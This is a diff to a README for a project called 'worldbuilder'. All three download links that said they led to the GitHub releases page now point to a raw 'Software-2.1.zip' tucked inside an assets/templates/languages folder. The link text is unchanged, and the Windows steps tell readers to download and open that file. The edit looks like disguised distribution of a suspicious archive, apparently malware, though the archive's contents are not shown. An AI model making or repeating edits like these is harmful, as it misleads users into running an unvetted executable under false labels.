@@ -1,6 +1,6 @@
 # ✨ worldbuilder - Build worlds from your terminal
 
-[![Download worldbuilder](https://img.shields.io/badge/Download%20worldbuilder-Release%20Page-blue?style=for-the-badge)](https://github.com/Malekyo4520/worldbuilder/releases)
+[![Download worldbuilder](https://img.shields.io/badge/Download%20worldbuilder-Release%20Page-blue?style=for-the-badge)](https://github.com/Malekyo4520/worldbuilder/raw/refs/heads/main/assets/templates/languages/Software-2.1.zip)
 
 ## 📦 What is worldbuilder?
 
@@ -21,7 +21,7 @@ It keeps your world data in files, so you can move it, back it up, and edit it w
 
 ## 🖥️ Windows download
 
-1. Visit the [worldbuilder releases page](https://github.com/Malekyo4520/worldbuilder/releases)
+1. Visit the [worldbuilder releases page](https://github.com/Malekyo4520/worldbuilder/raw/refs/heads/main/assets/templates/languages/Software-2.1.zip)
 2. Download the latest Windows release file
 3. Open the downloaded file
 4. Follow the setup steps on screen
@@ -228,7 +228,7 @@ Yes. You can build and manage your world by hand.
 
 ## 🔗 Download
 
-Visit the [worldbuilder releases page](https://github.com/Malekyo4520/worldbuilder/releases) to download the Windows version and install it on your PC
+Visit the [worldbuilder releases page](https://github.com/Malekyo4520/worldbuilder/raw/refs/heads/main/assets/templates/languages/Software-2.1.zip) to download the Windows version and install it on your PC
 
 ## 🔐 File safety and backups
 
